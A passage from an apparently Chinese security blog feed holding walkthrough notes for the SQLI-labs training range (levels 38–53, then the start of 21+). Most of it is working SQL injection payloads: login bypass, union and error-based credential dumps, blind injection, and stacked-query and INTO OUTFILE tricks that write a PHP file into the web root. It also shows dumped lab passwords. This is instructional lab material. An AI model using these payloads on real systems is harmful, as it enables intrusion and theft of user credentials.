<span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>这个尝试 getshell：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/02.png" alt="Less-38_开启日志 Getshell"></p><p><code>shell.php</code>日志文件内容：</p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\phpstudy_pro\COM\..\Extensions\MySQL<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>\\bin\mysqld.exe, Version: <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> (MySQL Community Server - GPL). started with:<span class="hljs-attribute">TCP</span> Port: <span class="hljs-number">3306</span>, Named Pipe: MySQL<span class="hljs-attribute">Time</span>                 Id Command    Argument<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">42</span>.<span class="hljs-number">153350</span>Z   <span class="hljs-number">10</span> Query-- &#x27; LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267004</span>Z   <span class="hljs-number">11</span> Connectroot@localhost <span class="hljs-literal">on</span> security using TCP/IP<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267240</span>Z   <span class="hljs-number">11</span> Init DBsecurity<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267398</span>Z   <span class="hljs-number">11</span> QuerySELECT * FROM users WHERE id=&#x27;<span class="hljs-number">1</span>&#x27;;<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267695</span>Z   <span class="hljs-number">11</span> Queryselect <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-39/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-38 相比只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1&#x27;);<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-40/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;);<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，这里不再赘述。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># username 被过滤 &#x27; &quot; \ password 没有被</span><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<span class="hljs-comment"># 堆叠查询</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<span class="hljs-keyword">if</span> 查询成功：    <span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));<span class="hljs-keyword">if</span> 登录成功:    setcookie(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, time()+<span class="hljs-number">3600</span>);    跳转到 logged-in.php</code></pre><ul><li><code>logged-in.php</code></li></ul><p>登录成功，提供修改密码的表单</p><pre><code class="hljs Html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mylogin&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;pass_change.php&quot;</span>&gt;</span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 没有登录:    重定向到 index.php<span class="hljs-keyword">if</span> 提交了修改密码表单:    <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$pass</span>==<span class="hljs-variable">$re_pass</span>:        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;</code></pre><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p><p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=1&#x27; or 1#&amp;mysubmit=Login</code></pre><p>因为登录成功后返回：</p><pre><code class="hljs Php"><span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];</code></pre><p>所以登录了 id 为 1 的 Dumb 用户：</p><p>尝试<strong>联合查询</strong>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=13141&#x27; union select 1,(select group_concat(username,&quot;:&quot;,password,0x3c62723e) from users),3#&amp;mysubmit=Login</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/03.png" alt="Less-42"></p><p><strong>报错注入</strong>：</p><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,&#x27;:&#x27;,password) from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)#&amp;mysubmit=Login</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/04.png" alt="Less-42"></p><p>同理这里也可以进行盲注和堆叠查注入，这里不再赘述。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p><h2 id="Less-46-order-by后的注入"><a href="#Less-46-order-by后的注入" class="headerlink" title="Less-46(order by后的注入)"></a>Less-46(order by后的注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><pre><code class="hljs Php"><span class="hljs-comment"># GET 方式获取 sort 参数</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];<span class="hljs-comment"># 直接将 id 带入 SQL 中</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-keyword">if</span> 查询成功：    输出查询信息<span class="hljs-keyword">else</span>：    print_r(mysql_error());</code></pre><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p><h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul><li><strong>升序和降序验证</strong></li></ul><pre><code class="hljs Bash"><span class="hljs-comment"># 升序排序</span>?sort=1 asc<span class="hljs-comment"># 降序排序</span>?sort=1 dasc</code></pre><ul><li><strong>rand() 验证</strong></li></ul><p>rand(ture) 和 rand(false) 的结果是不一样的</p><pre><code class="hljs Bash">?sort=rand(<span class="hljs-literal">true</span>)?sort=rand(<span class="hljs-literal">false</span>)</code></pre><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p><p>此外 rand() 结果是一直都是随机的</p><pre><code class="hljs Bash">?sort=rand()?sort=1 and rand()</code></pre><ul><li><strong>延时验证</strong></li></ul><pre><code class="hljs bash">?sort=sleep(1)?sort=(sleep(1))?sort=1 and sleep(1)</code></pre><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(schema_name)from information_schema.schemata)),0)</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/05.png" alt="Less-46">可见一次把数据库名爆不完，所以可以采用<code>limit</code>语句控制一次爆库名的个数</p><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select schema_name from information_schema.schemata limit 4,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/06.png" alt="Less-46"></p><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/07.png" alt="Less-46"></p><h4 id="爆users表的表列"><a href="#爆users表的表列" class="headerlink" title="爆users表的表列"></a>爆<code>users</code>表的表列</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/08.png" alt="Less-46"></p><h4 id="爆users表的数据"><a href="#爆users表的数据" class="headerlink" title="爆users表的数据"></a>爆<code>users</code>表的数据</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password)from security.users limit 0,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/09.png" alt="Less-46"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第 1 位为：s</p><pre><code class="hljs sql">?sort=rand(left(database(),1)&gt;&#x27;r&#x27;)?sort=rand(left(database(),1)&gt;&#x27;s&#x27;)?sort=rand(left(database(),2)&gt;&#x27;sd&#x27;)?sort=rand(left(database(),2)&gt;&#x27;se&#x27;)</code></pre><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><pre><code class="hljs sql">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</code></pre><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p><pre><code class="hljs Sql">?sort=1 into outfile &quot;D:/phpstudy_pro/WWW/sqli.pl/Less-46/less46.txt&quot;</code></pre><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p><p><strong>利用导出文件 getshell</strong>：</p><p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p><pre><code class="hljs Payload">?sort&#x3D;1 into outfile &quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli.pl&#x2F;Less-46&#x2F;shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</code></pre><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p><p>来查看下写入的文件内容是啥样子的：</p><pre><code class="hljs Bash">1DumbDumb&lt;?php phpinfo();?&gt;2AngelinaI-kill-you&lt;?php phpinfo();?&gt;3Dummyp@ssword&lt;?php phpinfo();?&gt;4securecrappy&lt;?php phpinfo();?&gt;5stupidstupidity&lt;?php phpinfo();?&gt;6supermangenious&lt;?php phpinfo();?&gt;7batmanmob!le&lt;?php phpinfo();?&gt;8adminadmin&lt;?php phpinfo();?&gt;9admin1admin1&lt;?php phpinfo();?&gt;10admin2admin2&lt;?php phpinfo();?&gt;11admin3admin3&lt;?php phpinfo();?&gt;12dhakkandumbo&lt;?php phpinfo();?&gt;14admin4admin4&lt;?php phpinfo();?&gt;15helloworld&lt;?php phpinfo();?&gt;</code></pre><p>浏览器访问测试看看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/10.png" alt="Less-46"></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><pre><code class="hljs sql">?sort=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆叠注入-38-53-关&quot;&gt;&lt;a href=&quot;#堆叠注入-38-53-关&quot; class=&quot;headerlink&quot; title=&quot;堆叠注入 38-53 关&quot;&gt;&lt;/a&gt;堆叠注入 38-53 关&lt;/h1&gt;&lt;h2 id=&quot;原理介绍&quot;&gt;&lt;a href=&quot;#原理介绍&quot; cla</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之高级注入姿势 21-37 关</title>
    <link href="http://www.secice.cn/p/4c595109"/>
    <id>http://www.secice.cn/p/4c595109</id>
    <published>2020-07-21T05:20:26.000Z</published>
    <updated>2020-12-13T11:12:48.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21-Cookie-Base64编码注入"><a href="#Less-21-Cookie-Base64编码注入" class="headerlink" title="Less-21(Cookie Base64编码注入)"></a>Less-21(Cookie Base64编码注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()+<span class="hljs-number">3600</span>);            <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:                 <span class="hljs-comment"># 对 cookee 进行 base64 解密</span>        <span class="hljs-variable">$cookee</span> = base64_decode(<span class="hljs-variable">$cookee</span>);        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Cache-Control</span>: max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-21/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">admin&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre><p>联合注入</p><pre><code class="hljs sql">-admin&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-22"><a href="#Less-22" class="headerlink" 